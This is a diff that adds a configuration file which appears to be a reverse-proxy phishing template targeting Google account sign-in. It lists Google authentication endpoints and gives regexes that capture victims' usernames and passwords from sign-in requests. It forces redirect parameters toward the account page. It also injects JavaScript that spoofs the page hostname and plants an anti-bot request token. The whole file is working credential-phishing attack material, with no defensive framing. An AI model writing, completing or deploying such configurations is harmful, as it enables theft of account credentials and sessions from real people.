@@ -1,0 +1,56 @@
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"`'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]' 
+      type: 'post'
+
+force_get:
+  - path: '/'
+    search:
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'get'
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+js_inject: |
+  Object.defineProperty(window, 'location', {
+    value: { hostname: 'accounts.google.com' },
+    writable: false
+  });
+  const observer = new MutationObserver(() => {
+    const req = document.querySelector('form[action*="batchexecute"]');
+    if (req) {
+      const token = 'valid_bgRequest_token_here'; // Replace via headless or reverse-engineer
+      req.querySelector('input[name="bgRequest"]').value = token;
+    }
+  });
+  observer.observe(document.body, { childList: true, subtree: true });
